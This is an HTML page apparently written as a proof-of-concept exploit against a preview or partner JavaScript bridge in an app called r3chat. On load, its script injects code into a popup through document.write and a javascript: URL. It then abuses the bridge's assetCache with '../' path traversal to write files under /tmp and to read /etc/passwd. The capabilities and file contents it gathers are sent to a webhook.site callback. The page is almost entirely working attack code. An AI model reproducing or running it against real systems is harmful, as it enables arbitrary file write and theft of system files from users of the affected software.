<!doctype html>
<meta charset="utf-8">
<script>
const CALLBACK = "https://webhook.site/02245dfe-0533-4e44-8390-43f3051d3aad";

async function log(data) {
  await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
}

(async () => {
  const b = window.rcPartner || window.previewBridge;
  if (!b) {
    if (!new URLSearchParams(location.search).has("stage2")) {
      const nonce = String(Date.now());
      const next = location.origin + location.pathname + "?stage2=1&nonce=" + nonce;
      const popup = window.open("https://www.google.com/?r3chat=" + nonce, "r3debug");
      await log({ stage: "dbg-open", popup: String(!!popup), next });

      try {
        const payload = `
          <script>
          const CALLBACK = ${JSON.stringify(CALLBACK)};
          async function log(data) {
            await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
          }
          (async () => {
            const b = window.rcPartner || window.previewBridge;
            await log({ stage: "blank-injected", href: location.href, hasBridge: String(!!b) });
            if (b) {
              await log({ stage: "blank-caps", caps: JSON.stringify(await b.capabilities()) });
              try {
                await b.assetCache.put("../../../../../../tmp/r3chat-blank", "blank write\\n", "utf8");
                await log({ stage: "blank-write-ok" });
              } catch (e) {
                await log({ stage: "blank-write-fail", err: String(e) });
              }
            }
          })().catch(e => log({ stage: "blank-error", err: String(e && (e.stack || e)) }));
          <\/script>`;
        popup.document.open();
        popup.document.write(payload);
        popup.document.close();
        await log({ stage: "dbg-blank-write-issued" });
      } catch (e) {
        await log({ stage: "dbg-blank-write-fail", err: String(e) });
      }

      setTimeout(async () => {
        try {
          popup.location.href = next + "&method=href";
          await log({ stage: "dbg-set-href" });
        } catch (e) {
          await log({ stage: "dbg-set-href-fail", err: String(e) });
        }
      }, 800);

      setTimeout(async () => {
        try {
          const js = `
            (async function(){
              const C=${JSON.stringify(CALLBACK)};
              async function L(d){ await fetch(C+"?"+new URLSearchParams(d), {mode:"no-cors"}); }
              try {
                const b = window.rcPartner || window.previewBridge;
                await L({stage:"jsurl-start", href:location.href, hasBridge:String(!!b)});
                if (!b) return;
                await L({stage:"jsurl-caps", caps:JSON.stringify(await b.capabilities())});
                try {
                  await b.assetCache.put("../../../../../../tmp/r3chat-jsurl", "jsurl write\\n", "utf8");
                  await L({stage:"jsurl-write-ok"});
                } catch(e) {
                  await L({stage:"jsurl-write-fail", err:String(e)});
                }
                try {
                  const p = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
                  await L({stage:"jsurl-read", sample:p.slice(0,180)});
                } catch(e) {
                  await L({stage:"jsurl-read-fail", err:String(e)});
                }
              } catch(e) {
                await L({stage:"jsurl-error", err:String(e && (e.stack || e))});
              }
            })()
          `;
          popup.location.href = "javascript:" + js.replace(/\s+/g, " ");
          await log({ stage: "dbg-jsurl-issued" });
        } catch (e) {
          await log({ stage: "dbg-jsurl-fail", err: String(e) });
        }
      }, 1500);

      setTimeout(async () => {
        try {
          popup.location.replace(next + "&method=replace");
          await log({ stage: "dbg-replace" });
        } catch (e) {
          await log({ stage: "dbg-replace-fail", err: String(e) });
        }
      }, 1800);

      setTimeout(async () => {
        try {
          const p2 = window.open(next + "&method=open-existing", "r3debug");
          await log({ stage: "dbg-open-existing", popup: String(!!p2) });
        } catch (e) {
          await log({ stage: "dbg-open-existing-fail", err: String(e) });
        }
      }, 2800);
      return;
    }
    await log({ stage: "stage2-no-bridge", href: location.href });
    return;
  }

  await log({ stage: "bridge", caps: JSON.stringify(await b.capabilities()) });

  const key = "../../../../../../tmp/r3chat-poc";
  await b.assetCache.put(key, "r3chat arbitrary file write\n", "utf8");
  await log({ stage: "wrote", key });

  try {
    const passwd = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
    await log({ stage: "read", sample: passwd.slice(0, 180) });
  } catch (e) {
    await log({ stage: "read-fail", err: String(e) });
  }
})().catch(e => log({ stage: "error", err: String(e && (e.stack || e)) }));
</script>
